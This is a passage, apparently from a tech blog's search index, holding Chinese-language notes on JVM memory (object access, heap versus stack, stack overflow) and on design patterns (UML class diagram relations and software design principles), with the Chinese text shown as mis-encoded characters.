ç¨‹åºçš„è§†è§’æ¥çœ‹ï¼Œå¯¹è±¡åˆ›å»ºæ‰åˆšå¼€å§‹ï¼Œ`<init>` æ–¹æ³•è¿˜æ²¡æœ‰æ‰§è¡Œï¼Œæ‰€æœ‰çš„å­—æ®µéƒ½è¿˜ä¸ºé›¶ã€‚æ‰€ä»¥ä¸€èˆ¬æ¥è¯´ï¼Œæ‰§è¡Œ new æŒ‡ä»¤ä¹‹åä¼šæ¥ç€æ‰§è¡Œ `<init>` æ–¹æ³•ï¼ŒæŠŠå¯¹è±¡æŒ‰ç…§ç¨‹åºå‘˜çš„æ„æ„¿è¿›è¡Œåˆå§‹åŒ–ï¼Œè¿™æ ·ä¸€ä¸ªçœŸæ­£å¯ç”¨çš„å¯¹è±¡æ‰ç®—å®Œå…¨äº§ç”Ÿå‡ºæ¥ã€‚\n\n###  Javaå¯¹è±¡çš„å®šä½æ–¹å¼\n\nJava ç¨‹åºé€šè¿‡æ ˆä¸Šçš„ reference æ•°æ®æ¥æ“ä½œå †ä¸Šçš„å…·ä½“å¯¹è±¡ã€‚å¯¹è±¡çš„è®¿é—®æ–¹å¼ç”±è™šæ‹Ÿæœºå®ç°è€Œå®šï¼Œç›®å‰ä¸»æµçš„è®¿é—®æ–¹å¼æœ‰ï¼š**å¥æŸ„**ã€**ç›´æ¥æŒ‡é’ˆ**ã€‚\n\n**å¥æŸ„**\n\n- Java å †ä¸­å°†ä¼šåˆ’åˆ†å‡ºä¸€å—å†…å­˜æ¥ä½œä¸ºå¥æŸ„æ± ï¼Œ**reference ä¸­å­˜å‚¨çš„å°±æ˜¯å¯¹è±¡çš„å¥æŸ„åœ°å€**ï¼Œè€Œå¥æŸ„ä¸­åŒ…å«äº†å¯¹è±¡å®ä¾‹æ•°æ®ä¸ç±»å‹æ•°æ®å„è‡ªçš„å…·ä½“åœ°å€ä¿¡æ¯ã€‚\n- ä½¿ç”¨å¥æŸ„æ¥è®¿é—®çš„æœ€å¤§å¥½å¤„æ˜¯ reference ä¸­å­˜å‚¨çš„æ˜¯ç¨³å®šçš„å¥æŸ„åœ°å€ï¼Œåœ¨å¯¹è±¡è¢«ç§»åŠ¨æ—¶åªä¼šæ”¹å˜å¥æŸ„ä¸­çš„å®ä¾‹æ•°æ®æŒ‡é’ˆï¼Œè€Œ reference æœ¬èº«ä¸éœ€è¦ä¿®æ”¹ã€‚\n\n**ç›´æ¥æŒ‡é’ˆ**\n\n- **reference ä¸­å­˜å‚¨çš„ç›´æ¥å°±æ˜¯å¯¹è±¡çš„åœ°å€**ã€‚å¯¹è±¡åŒ…å«åˆ°å¯¹è±¡ç±»å‹æ•°æ®çš„æŒ‡é’ˆï¼Œé€šè¿‡è¿™ä¸ªæŒ‡é’ˆå¯ä»¥è®¿é—®å¯¹è±¡ç±»å‹æ•°æ®ã€‚\n- ä½¿ç”¨ç›´æ¥æŒ‡é’ˆè®¿é—®æ–¹å¼æœ€å¤§çš„å¥½å¤„æ˜¯è®¿é—®å¯¹è±¡é€Ÿåº¦å¿«ï¼Œå®ƒèŠ‚çœäº†ä¸€æ¬¡æŒ‡é’ˆå®šä½çš„æ—¶é—´å¼€é”€ï¼Œè™šæ‹ŸæœºHotSpotä¸»è¦æ˜¯ä½¿ç”¨ç›´æ¥æŒ‡é’ˆæ¥è®¿é—®å¯¹è±¡ã€‚\n\n##  è¯´ä¸€ä¸‹å †æ ˆçš„åŒºåˆ«ï¼Ÿ\n\n|              å †              |                     æ ˆ                     |\n| :--------------------------: | :----------------------------------------: |\n|         äººä¸ºç”³è¯·å¼€è¾Ÿ         |               ç”±ç³»ç»Ÿè‡ªåŠ¨åˆ†é…               |\n|           æ€§èƒ½è¾ƒæ…¢           |                æ€§èƒ½ç›¸å¯¹è¾ƒå¿«                |\n|     ç‰©ç†åœ°å€åˆ†é…æ˜¯ä¸è¿ç»­     |            ç‰©ç†åœ°å€åˆ†é…æ˜¯è¿ç»­çš„            |\n| å­˜æ”¾çš„æ˜¯**å¯¹è±¡çš„å®ä¾‹å’Œæ•°ç»„** | å­˜æ”¾çš„æ˜¯**å±€éƒ¨å˜é‡ï¼Œæ“ä½œæ•°æ ˆï¼Œè¿”å›ç»“æœ**ç­‰ |\n|           çº¿ç¨‹å…±äº«           |                  çº¿ç¨‹ç§æœ‰                  |\n\n##  ä»€ä¹ˆæƒ…å†µä¸‹ä¼šå‘ç”Ÿæ ˆæº¢å‡ºï¼Ÿ\n\n- å½“çº¿ç¨‹è¯·æ±‚çš„æ ˆæ·±åº¦è¶…è¿‡äº†è™šæ‹Ÿæœºå…è®¸çš„æœ€å¤§æ·±åº¦æ—¶ï¼Œä¼šæŠ›å‡º`StackOverFlowError`å¼‚å¸¸ã€‚è¿™ç§æƒ…å†µé€šå¸¸æ˜¯å› ä¸ºæ–¹æ³•é€’å½’æ²¡ç»ˆæ­¢æ¡ä»¶ã€‚\n- æ–°å»ºçº¿ç¨‹çš„æ—¶å€™æ²¡æœ‰è¶³å¤Ÿçš„å†…å­˜å»åˆ›å»ºå¯¹åº”çš„è™šæ‹Ÿæœºæ ˆï¼Œè™šæ‹Ÿæœºä¼šæŠ›å‡º`OutOfMemoryError`å¼‚å¸¸ã€‚æ¯”å¦‚çº¿ç¨‹å¯åŠ¨è¿‡å¤šå°±ä¼šå‡ºç°è¿™ç§æƒ…å†µã€‚\n\n\n\n### Java ç±»çš„åŠ è½½æµç¨‹æ˜¯æ€æ ·çš„ï¼Ÿ\n\n\n\n### ä»€ä¹ˆæ˜¯åŒäº²å§”æ´¾æœºåˆ¶ï¼Ÿ\n\n\n\n\n\nJVM å†…å­˜æ˜¯å¦‚ä½•å¯¹åº”åˆ°æ“ä½œç³»ç»Ÿå†…å­˜çš„ï¼Ÿ\n\nä»€ä¹ˆæ˜¯æŒ‡ä»¤åºåˆ—é‡æ’åºï¼Ÿ\n\nç®€è¿° CMS ä¸ G1 æœºåˆ¶çš„åŒºåˆ«\n\nJVM æ˜¯æ€ä¹ˆå»è°ƒä¼˜çš„ï¼Ÿäº†è§£å“ªäº›å‚æ•°å’ŒæŒ‡ä»¤ï¼Ÿ\n\nå¦‚ä½•ä¼˜åŒ– JVM é¢‘ç¹ minor GC\n\nJava ä¸­å¦‚ä½•è¿›è¡Œ GC è°ƒä¼˜ï¼Ÿ\n\n\n\n# å‚è€ƒ\n\n[Javaè™šæ‹Ÿæœºï¼ˆJVMï¼‰é¢è¯•ä¸“é¢˜ ä¸Š_é¢å‘é¸¿è’™ç¼–ç¨‹çš„åšå®¢-CSDNåšå®¢](https://blog.csdn.net/weixin_43715214/article/details/126694782)\n\n[JVM å­¦ä¹ ç¬”è®°ï¼ˆä¸€ï¼‰å†…å­˜ç»“æ„_CodeAliçš„åšå®¢-CSDNåšå®¢](https://blog.csdn.net/weixin_50280576/article/details/113742011)\n\n[JVM_Demon_bhçš„åšå®¢-CSDNåšå®¢](https://blog.csdn.net/baihang111/category_11890188.html?spm=1001.2014.3001.5482)\n\n[JAVAç›¸å…³çš„æ·±åº¦æŠ€æœ¯åšå®¢é“¾æ¥_ä¸åŸ‹é›·çš„æ¢é•¿çš„åšå®¢-CSDNåšå®¢](https://blog.csdn.net/weixin_32265569/article/details/107575286)\n\n[Javaå­—èŠ‚ç çš„ä¸€æ®µæ—…è¡Œç»å†â€”â€”æå‡ç¡¬å®åŠ›1_ä¸åŸ‹é›·çš„æ¢é•¿çš„åšå®¢-CSDNåšå®¢_classæ–‡ä»¶çš„æ—…ç¨‹](https://blog.csdn.net/weixin_32265569/article/details/107904061)\n\n[Seazean/JavaNote: ğŸ“æˆ‘ä¸æ˜¯çš„çŸ¥è¯†çš„ç”Ÿäº§è€…ï¼Œæˆ‘åªæ˜¯çŸ¥è¯†çš„æ¬è¿å·¥ (github.com)](https://github.com/Seazean/JavaNote)\n\n[JVMçš„è¿è¡ŒåŸç†](http://wangwren.com/2019/11/JVM%E5%86%85%E5%AD%98%E6%A8%A1%E5%9E%8B/#JVM%E7%9A%84%E8%BF%90%E8%A1%8C%E5%8E%9F%E7%90%86)\n\n[å°šç¡…è°·JVM](https://www.yuque.com/u21195183/jvm/qpoa81)\n\n# Sponsorâ¤ï¸\n\næ‚¨çš„æ”¯æŒæ˜¯æˆ‘ä¸æ–­å‰è¿›çš„åŠ¨åŠ›ï¼Œå¦‚æœæ‚¨æ„Ÿè§‰æœ¬æ–‡å¯¹æ‚¨æœ‰æ‰€å¸®åŠ©çš„è¯ï¼Œå¯ä»¥è€ƒè™‘æ‰“èµä¸€ä¸‹æœ¬æ–‡ï¼Œç”¨ä»¥ç»´æŒæœ¬åšå®¢çš„è¿è¥è´¹ç”¨ï¼Œæ‹’ç»ç™½å«–ï¼Œä»ä½ æˆ‘åšèµ·ï¼ğŸ¥°ğŸ¥°ğŸ¥°\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">æ”¯ä»˜å®</td>\n         <td style=\"text-align:center;\">å¾®ä¿¡</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/sponor_wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["JVM"],"categories":["JavaSE"]},{"title":"Java-è®¾è®¡æ¨¡å¼","url":"/posts/50902.html","content":"\n# â“ªè®¾è®¡æ¨¡å¼åŸºç¡€\n\n## â¶è®¾è®¡æ¨¡å¼åˆ†ç±»\n\n* **åˆ›å»ºå‹æ¨¡å¼**\n\nç”¨äºæè¿°**å¯¹è±¡å®ä¾‹åŒ–ï¼ˆåˆ›å»ºå¯¹è±¡ï¼‰çš„æ¨¡å¼ï¼Œå³ç”¨äºè§£è€¦å¯¹è±¡çš„å®ä¾‹åŒ–è¿‡ç¨‹**\n\nGoFï¼ˆå››äººç»„ï¼‰ä¹¦ä¸­æä¾›äº†å•ä¾‹ã€åŸå‹ã€å·¥å‚æ–¹æ³•ã€æŠ½è±¡å·¥å‚ã€å»ºé€ è€…ç­‰ **5 ç§åˆ›å»ºå‹æ¨¡å¼**ã€‚\n\n* **ç»“æ„å‹æ¨¡å¼**\n\nç”¨äºæè¿°å¦‚ä½•**æŠŠç±»æˆ–å¯¹è±¡ç»“åˆåœ¨ä¸€èµ·å½¢æˆä¸€ä¸ªæ›´å¤§çš„ç»“æ„**ï¼Œ\n\nGoFï¼ˆå››äººç»„ï¼‰ä¹¦ä¸­æä¾›äº†ä»£ç†ã€é€‚é…å™¨ã€æ¡¥æ¥ã€è£…é¥°ã€å¤–è§‚ã€äº«å…ƒã€ç»„åˆç­‰ **7 ç§ç»“æ„å‹æ¨¡å¼**ã€‚\n\n* **è¡Œä¸ºå‹æ¨¡å¼**\n\nç”¨äºæè¿°**ç±»å’Œå¯¹è±¡å¦‚ä½•äº¤äº’ï¼ŒåŠåˆ’åˆ†è´£ä»»å’Œç®—æ³•**ã€‚\n\nGoFï¼ˆå››äººç»„ï¼‰ä¹¦ä¸­æä¾›äº†æ¨¡æ¿æ–¹æ³•ã€ç­–ç•¥ã€å‘½ä»¤ã€èŒè´£é“¾ã€çŠ¶æ€ã€è§‚å¯Ÿè€…ã€ä¸­ä»‹è€…ã€è¿­ä»£å™¨ã€è®¿é—®è€…ã€å¤‡å¿˜å½•ã€è§£é‡Šå™¨ç­‰ **11 ç§è¡Œä¸ºå‹æ¨¡å¼**ã€‚\n\n## â·UML-ç±»å›¾\n\n> ç»Ÿä¸€å»ºæ¨¡è¯­è¨€ï¼ˆUnified Modeling Languageï¼ŒUMLï¼‰æ˜¯ç”¨æ¥è®¾è®¡è½¯ä»¶çš„å¯è§†åŒ–å»ºæ¨¡è¯­è¨€ã€‚å®ƒçš„ç‰¹ç‚¹æ˜¯ç®€å•ã€ç»Ÿä¸€ã€å›¾å½¢åŒ–ã€èƒ½è¡¨è¾¾è½¯ä»¶è®¾è®¡ä¸­çš„åŠ¨æ€ä¸é™æ€ä¿¡æ¯ã€‚UML ä»ç›®æ ‡ç³»ç»Ÿçš„ä¸åŒè§’åº¦å‡ºå‘ï¼Œå®šä¹‰äº†ç”¨ä¾‹å›¾ã€ç±»å›¾ã€å¯¹è±¡å›¾ã€çŠ¶æ€å›¾ã€æ´»åŠ¨å›¾ã€æ—¶åºå›¾ã€åä½œå›¾ã€æ„ä»¶å›¾ã€éƒ¨ç½²å›¾ç­‰ 9 ç§å›¾ã€‚\n\nç±»å›¾(Class diagram)æ˜¯æ˜¾ç¤ºäº†æ¨¡å‹çš„é™æ€ç»“æ„ï¼Œç‰¹åˆ«æ˜¯æ¨¡å‹ä¸­å­˜åœ¨çš„ç±»ã€ç±»çš„å†…éƒ¨ç»“æ„ä»¥åŠå®ƒä»¬ä¸å…¶ä»–ç±»çš„å…³ç³»ç­‰ã€‚ç±»å›¾ä¸æ˜¾ç¤ºæš‚æ—¶æ€§çš„ä¿¡æ¯ã€‚ç±»å›¾æ˜¯é¢å‘å¯¹è±¡å»ºæ¨¡çš„ä¸»è¦ç»„æˆéƒ¨åˆ†ã€‚\n\n### 0.ç±»å›¾è¡¨ç¤ºæ³•\n\nåœ¨UMLç±»å›¾ä¸­ï¼Œç±»ä½¿ç”¨åŒ…å«ç±»åã€å±æ€§(field) å’Œæ–¹æ³•(method) ä¸”å¸¦æœ‰åˆ†å‰²çº¿çš„çŸ©å½¢æ¥è¡¨ç¤ºï¼Œæ¯”å¦‚ä¸‹å›¾è¡¨ç¤ºä¸€ä¸ªEmployeeç±»ï¼Œå®ƒåŒ…å«name,ageå’Œaddressè¿™3ä¸ªå±æ€§ï¼Œä»¥åŠwork()æ–¹æ³•ã€‚ \n\n![](https://img.jwt1399.top/img/202211082308467.png)\n\nå±æ€§/æ–¹æ³•åç§°å‰åŠ çš„åŠ å·å’Œå‡å·è¡¨ç¤ºäº†è¿™ä¸ªå±æ€§/æ–¹æ³•çš„å¯è§æ€§ï¼ŒUMLç±»å›¾ä¸­è¡¨ç¤ºå¯è§æ€§çš„ç¬¦å·æœ‰ä¸‰ç§ï¼š\n\n* +ï¼šè¡¨ç¤ºpublic\n\n* -ï¼šè¡¨ç¤ºprivate\n\n* #ï¼šè¡¨ç¤ºprotected\n\n* ä»€ä¹ˆéƒ½ä¸åŠ è¡¨ç¤ºdefault\n\nå±æ€§çš„å®Œæ•´è¡¨ç¤ºæ–¹å¼æ˜¯ï¼š **å¯è§æ€§  åç§° ï¼šç±»å‹ [ = ç¼ºçœå€¼]**  \n\næ–¹æ³•çš„å®Œæ•´è¡¨ç¤ºæ–¹å¼æ˜¯ï¼š **å¯è§æ€§  åç§°(å‚æ•°åˆ—è¡¨) [ ï¼š è¿”å›ç±»å‹]**\n\n> æ³¨æ„ï¼š\n>\n> â€‹\t1ï¼Œä¸­æ‹¬å·ä¸­çš„å†…å®¹è¡¨ç¤ºæ˜¯å¯é€‰çš„\n>\n> â€‹\t2ï¼Œä¹Ÿæœ‰å°†ç±»å‹æ”¾åœ¨å˜é‡åå‰é¢ï¼Œè¿”å›å€¼ç±»å‹æ”¾åœ¨æ–¹æ³•åå‰é¢\n\n![ç±»çš„å…³ç³»](https://img.jwt1399.top/img/202211082325582.png)\n\n### 1.å…³è”å…³ç³»\n\n> é€šå¸¸å…³è”å…³ç³»ç”¨æ¥å®ç°è¿æ¥æœ‰å…³è”çš„å¯¹è±¡æ‰€å¯¹åº”çš„ç±»ï¼Œå³å°†ä¸€ä¸ªç±»çš„å¯¹è±¡ä½œä¸ºå¦ä¸€ä¸ªç±»çš„å±æ€§ã€‚å…³è”åˆå¯ä»¥åˆ†ä¸ºå•å‘å…³è”ï¼ŒåŒå‘å…³è”ï¼Œè‡ªå…³è”ã€‚\n\n#### **a.å•å‘å…³è”**\n\nå•å‘å…³è”ç”¨ä¸€ä¸ªå¸¦ç®­å¤´çš„å®çº¿è¡¨ç¤ºã€‚ä¸‹å›¾è¡¨ç¤ºæ¯ä¸ªé¡¾å®¢éƒ½æœ‰ä¸€ä¸ªåœ°å€ï¼Œè¿™é€šè¿‡è®©Customerç±»æŒæœ‰ä¸€ä¸ªç±»å‹ä¸ºAddressçš„æˆå‘˜å˜é‡ç±»å®ç°ã€‚\n\n![](https://img.jwt1399.top/img/202211082320339.png)\n\n#### **b.åŒå‘å…³è”**\n\nåŒå‘å…³è”å°±æ˜¯åŒæ–¹å„è‡ªæŒæœ‰å¯¹æ–¹ç±»å‹çš„æˆå‘˜å˜é‡ã€‚åŒå‘å…³è”ç”¨ä¸€ä¸ªä¸å¸¦ç®­å¤´çš„ç›´çº¿è¡¨ç¤ºã€‚ä¸‹å›¾ä¸­åœ¨Customerç±»ä¸­ç»´æŠ¤ä¸€ä¸ªList\\<Product>ï¼Œè¡¨ç¤ºä¸€ä¸ªé¡¾å®¢å¯ä»¥è´­ä¹°å¤šä¸ªå•†å“ï¼›åœ¨Productç±»ä¸­ç»´æŠ¤ä¸€ä¸ªCustomerç±»å‹çš„æˆå‘˜å˜é‡è¡¨ç¤ºè¿™ä¸ªäº§å“è¢«å“ªä¸ªé¡¾å®¢æ‰€è´­ä¹°ã€‚\n\n![](https://img.jwt1399.top/img/202211082320373.png)\n\n#### **c.è‡ªå…³è”**\n\nè‡ªå…³è”ç”¨ä¸€ä¸ªå¸¦æœ‰ç®­å¤´ä¸”æŒ‡å‘è‡ªèº«çš„çº¿è¡¨ç¤ºã€‚ä¸‹å›¾çš„æ„æ€å°±æ˜¯Nodeç±»åŒ…å«ç±»å‹ä¸ºNodeçš„æˆå‘˜å˜é‡ï¼Œä¹Ÿå°±æ˜¯â€œè‡ªå·±åŒ…å«è‡ªå·±â€ã€‚\n\n![](https://img.jwt1399.top/img/202211082320886.png)\n\n### 2.èšåˆå…³ç³»\n\n> èšåˆå…³ç³»è¡¨ç¤ºæ•´ä½“ä¸éƒ¨åˆ†çš„å…³ç³»ï¼Œæˆå‘˜å¯¹è±¡æ˜¯æ•´ä½“å¯¹è±¡çš„ä¸€éƒ¨åˆ†ï¼Œä½†æ˜¯æˆå‘˜å¯¹è±¡å¯ä»¥è„±ç¦»æ•´ä½“å¯¹è±¡è€Œç‹¬ç«‹å­˜åœ¨ã€‚ä¾‹å¦‚ï¼Œå­¦æ ¡ä¸è€å¸ˆçš„å…³ç³»ï¼Œå­¦æ ¡åŒ…å«è€å¸ˆï¼Œä½†å¦‚æœå­¦æ ¡åœåŠäº†ï¼Œè€å¸ˆä¾ç„¶å­˜åœ¨ã€‚\n\nèšåˆå…³ç³»å¯ä»¥ç”¨å¸¦ç©ºå¿ƒè±å½¢çš„å®çº¿æ¥è¡¨ç¤ºï¼Œè±å½¢æŒ‡å‘æ•´ä½“ã€‚ä¸‹å›¾æ‰€ç¤ºæ˜¯å¤§å­¦å’Œæ•™å¸ˆçš„å…³ç³»å›¾ï¼š\n\n![](https://img.jwt1399.top/img/202211082328836.png)\n\n### 3.ç»„åˆå…³ç³»\n\n> ç»„åˆè¡¨ç¤ºç±»ä¹‹é—´çš„æ•´ä½“ä¸éƒ¨åˆ†çš„å…³ç³»ï¼Œä½†å®ƒæ˜¯ä¸€ç§æ›´å¼ºçƒˆçš„èšåˆå…³ç³»ã€‚åœ¨ç»„åˆå…³ç³»ä¸­ï¼Œæ•´ä½“å¯¹è±¡å¯ä»¥æ§åˆ¶éƒ¨åˆ†å¯¹è±¡çš„ç”Ÿå‘½å‘¨æœŸï¼Œä¸€æ—¦æ•´ä½“å¯¹è±¡ä¸å­˜åœ¨ï¼Œéƒ¨åˆ†å¯¹è±¡ä¹Ÿå°†ä¸å­˜åœ¨ï¼Œéƒ¨åˆ†å¯¹è±¡ä¸èƒ½è„±ç¦»æ•´ä½“å¯¹è±¡è€Œå­˜åœ¨ã€‚ä¾‹å¦‚ï¼Œå¤´å’Œå˜´çš„å…³ç³»ï¼Œæ²¡æœ‰äº†å¤´ï¼Œå˜´ä¹Ÿå°±ä¸å­˜åœ¨äº†ã€‚\n\nç»„åˆå…³ç³»ç”¨å¸¦å®å¿ƒè±å½¢çš„å®çº¿æ¥è¡¨ç¤ºï¼Œè±å½¢æŒ‡å‘æ•´ä½“ã€‚ä¸‹å›¾æ‰€ç¤ºæ˜¯å¤´å’Œå˜´çš„å…³ç³»å›¾ï¼š\n\n![](https://img.jwt1399.top/img/202211082330291.png)\n\n### 4.ä¾èµ–å…³ç³»\n\n> ä¾èµ–å…³ç³»æ˜¯ä¸€ç§ä½¿ç”¨å…³ç³»ï¼Œå®ƒæ˜¯å¯¹è±¡ä¹‹é—´è€¦åˆåº¦æœ€å¼±çš„ä¸€ç§å…³è”æ–¹å¼ï¼Œæ˜¯ä¸´æ—¶æ€§çš„å…³è”ã€‚åœ¨ä»£ç ä¸­ï¼ŒæŸä¸ªç±»çš„æ–¹æ³•é€šè¿‡å±€éƒ¨å˜é‡ã€æ–¹æ³•çš„å‚æ•°æˆ–è€…å¯¹é™æ€æ–¹æ³•çš„è°ƒç”¨æ¥è®¿é—®å¦ä¸€ä¸ªç±»ï¼ˆè¢«ä¾èµ–ç±»ï¼‰ä¸­çš„æŸäº›æ–¹æ³•æ¥å®Œæˆä¸€äº›èŒè´£ã€‚\n\nä¾èµ–å…³ç³»ä½¿ç”¨å¸¦ç®­å¤´çš„è™šçº¿æ¥è¡¨ç¤ºï¼Œç®­å¤´ä»ä½¿ç”¨ç±»æŒ‡å‘è¢«ä¾èµ–çš„ç±»ã€‚ä¸‹å›¾æ‰€ç¤ºæ˜¯å¸æœºå’Œæ±½è½¦çš„å…³ç³»å›¾ï¼Œå¸æœºé©¾é©¶æ±½è½¦ï¼š\n\n![](https://img.jwt1399.top/img/202211082332399.png)\n\nä»å›¾ä¸­å¯ä»¥çœ‹å‡ºDriverä¸­ä½¿ç”¨äº†Carçš„moveæ–¹æ³•ã€‚é‚£ä¹ˆå°±è¯´æ˜Driveræ˜¯ä¾èµ–äºCaræ‰èƒ½åšDriverçš„èŒè´£ã€‚é‚£ä¹ˆåˆæœ‰äººä¼šé—®èšåˆä¸ä¾èµ–æœ‰åŒºåˆ«å—ï¼Œå½“ç„¶å¾ˆæ˜æ˜¾Driveræ˜¯ä¸€ä¸ªæ•´ä½“ï¼ŒCarä¹Ÿæ˜¯æ•´ä½“ã€‚ä¸æ˜¯æ•´ä½“ä¸éƒ¨åˆ†å…³ç³»ã€‚\n\n### 5.ç»§æ‰¿å…³ç³»\n\n> ç»§æ‰¿å…³ç³»æ˜¯å¯¹è±¡ä¹‹é—´è€¦åˆåº¦æœ€å¤§çš„ä¸€ç§å…³ç³»ï¼Œè¡¨ç¤ºä¸€èˆ¬ä¸ç‰¹æ®Šçš„å…³ç³»ï¼Œæ˜¯çˆ¶ç±»ä¸å­ç±»ä¹‹é—´çš„å…³ç³»ï¼Œæ˜¯ä¸€ç§ç»§æ‰¿å…³ç³»ã€‚\n\næ³›åŒ–(ç»§æ‰¿)å…³ç³»ç”¨å¸¦ç©ºå¿ƒä¸‰è§’ç®­å¤´çš„å®çº¿æ¥è¡¨ç¤ºï¼Œç®­å¤´ä»å­ç±»æŒ‡å‘çˆ¶ç±»ã€‚ä¾‹å¦‚ï¼ŒStudent ç±»å’Œ Teacher ç±»éƒ½æ˜¯ Person ç±»çš„å­ç±»ï¼Œå…¶ç±»å›¾å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š\n\n![](https://img.jwt1399.top/img/202211082333096.png)\n\n\n\n### 6.å®ç°å…³ç³»\n\n> å®ç°å…³ç³»æ˜¯æ¥å£ä¸å®ç°ç±»ä¹‹é—´çš„å…³ç³»ã€‚åœ¨è¿™ç§å…³ç³»ä¸­ï¼Œç±»å®ç°äº†æ¥å£ï¼Œç±»ä¸­çš„æ“ä½œå®ç°äº†æ¥å£ä¸­æ‰€å£°æ˜çš„æ‰€æœ‰çš„æŠ½è±¡æ“ä½œã€‚\n\nå®ç°å…³ç³»ä½¿ç”¨å¸¦ç©ºå¿ƒä¸‰è§’ç®­å¤´çš„è™šçº¿æ¥è¡¨ç¤ºï¼Œç®­å¤´ä»å®ç°ç±»æŒ‡å‘æ¥å£ã€‚ä¾‹å¦‚ï¼Œæ±½è½¦å’Œèˆ¹å®ç°äº†äº¤é€šå·¥å…·ï¼Œå…¶ç±»å›¾å¦‚å›¾æ‰€ç¤ºã€‚\n\n![](https://img.jwt1399.top/img/202211082334819.png)\n\n## â¸è½¯ä»¶è®¾è®¡åŸåˆ™\n\n> åœ¨è½¯ä»¶å¼€å‘ä¸­ï¼Œä¸ºäº†æé«˜è½¯ä»¶ç³»ç»Ÿçš„å¯ç»´æŠ¤æ€§å’Œå¯å¤ç”¨æ€§ï¼Œå¢åŠ è½¯ä»¶çš„å¯æ‰©å±•æ€§å’Œçµæ´»æ€§ï¼Œç¨‹åºå‘˜è¦å°½é‡æ ¹æ®6æ¡åŸåˆ™æ¥å¼€å‘ç¨‹åºï¼Œä»è€Œæé«˜è½¯ä»¶å¼€å‘æ•ˆç‡ã€èŠ‚çº¦è½¯ä»¶å¼€å‘æˆæœ¬å’Œç»´æŠ¤æˆæœ¬ã€‚\n\n### 1.å¼€é—­åŸåˆ™ï¼ˆOCPï¼‰\n\n**å¯¹æ‰©å±•å¼€æ”¾ï¼Œå¯¹ä¿®æ”¹å…³é—­**ã€‚åœ¨ç¨‹åºéœ€è¦è¿›è¡Œæ‹“å±•çš„æ—¶å€™ï¼Œä¸èƒ½å»ä¿®æ”¹åŸæœ‰çš„ä»£ç ï¼Œå®ç°ä¸€ä¸ªçƒ­æ’æ‹”çš„æ•ˆæœã€‚ç®€è¨€ä¹‹ï¼Œæ˜¯ä¸ºäº†ä½¿ç¨‹åºçš„æ‰©å±•æ€§å¥½ï¼Œæ˜“äºç»´æŠ¤å’Œå‡çº§ã€‚æƒ³è¦è¾¾åˆ°è¿™æ ·çš„æ•ˆæœï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨æ¥å£å’ŒæŠ½è±¡ç±»ã€‚\n\nå› ä¸ºæŠ½è±¡çµæ´»æ€§å¥½ï¼Œé€‚åº”æ€§å¹¿ï¼Œåªè¦æŠ½è±¡çš„åˆç†ï¼Œå¯ä»¥åŸºæœ¬ä¿æŒè½¯ä»¶æ¶æ„çš„ç¨³å®šã€‚è€Œè½¯ä»¶ä¸­æ˜“å˜çš„ç»†èŠ‚å¯ä»¥ä»æŠ½è±¡æ´¾ç”Ÿæ¥çš„å®ç°ç±»æ¥è¿›è¡Œæ‰©å±•ï¼Œå½“è½¯ä»¶éœ€è¦å‘ç”Ÿå˜åŒ–æ—¶ï¼Œåªéœ€è¦æ ¹æ®éœ€æ±‚é‡æ–°æ´¾ç”Ÿä¸€ä¸ªå®ç°ç±»æ¥æ‰©å±•å°±å¯ä»¥äº†ã€‚\n\nã€ä¾‹ã€‘ä»¥ `æœç‹—è¾“å…¥æ³•` çš„çš®è‚¤ä¸ºä¾‹ä»‹ç»å¼€é—­åŸåˆ™çš„åº”ç”¨ã€‚\n\nåˆ†æï¼š`æœç‹—è¾“å…¥æ³•` çš„çš®è‚¤æ˜¯è¾“å…¥æ³•èƒŒæ™¯å›¾ç‰‡ã€çª—å£é¢œè‰²å’Œå£°éŸ³ç­‰å…ƒç´ çš„ç»„åˆã€‚ç”¨æˆ·å¯ä»¥æ ¹æ®è‡ªå·±çš„å–œçˆ±æ›´æ¢è‡ªå·±çš„è¾“å…¥æ³•çš„çš®è‚¤ï¼Œä¹Ÿå¯ä»¥ä»ç½‘ä¸Šä¸‹è½½æ–°çš„çš®è‚¤ã€‚è¿™äº›çš®è‚¤æœ‰å…±åŒçš„ç‰¹ç‚¹ï¼Œå¯ä»¥ä¸ºå…¶å®šä¹‰ä¸€ä¸ªæŠ½è±¡ç±»ï¼ˆAbstractSkinï¼‰ï¼Œè€Œæ¯ä¸ªå…·ä½“çš„çš®è‚¤ï¼ˆDefaultSpecificSkinå’ŒHeimaSpecificSkinï¼‰æ˜¯å…¶å­ç±»ã€‚ç”¨æˆ·çª—ä½“å¯ä»¥æ ¹æ®éœ€è¦é€‰æ‹©æˆ–è€…å¢åŠ æ–°çš„ä¸»é¢˜ï¼Œè€Œä¸éœ€è¦ä¿®æ”¹åŸä»£ç ï¼Œæ‰€ä»¥å®ƒæ˜¯æ»¡è¶³å¼€é—­åŸåˆ™çš„ã€‚![](https://img.jwt1399.top/img/202211082338060.png)\n\n### 2.é‡Œæ°ä»£æ¢åŸåˆ™ï¼ˆLSPï¼‰\n\nå­ç±»å¯ä»¥æ‰©å±•çˆ¶ç±»çš„åŠŸèƒ½ï¼Œä½†ä¸èƒ½æ”¹å˜çˆ¶ç±»åŸæœ‰çš„åŠŸèƒ½ã€‚æ¢å¥è¯è¯´ï¼Œå­ç±»ç»§æ‰¿çˆ¶ç±»æ—¶ï¼Œé™¤æ·»åŠ æ–°çš„æ–¹æ³•å®Œæˆæ–°å¢åŠŸèƒ½å¤–ï¼Œå°½é‡ä¸è¦é‡å†™çˆ¶ç±»çš„æ–¹æ³•ã€‚å¦‚æœé€šè¿‡é‡å†™çˆ¶ç±»çš„æ–¹æ³•æ¥å®Œæˆæ–°çš„åŠŸèƒ½ï¼Œè¿™æ 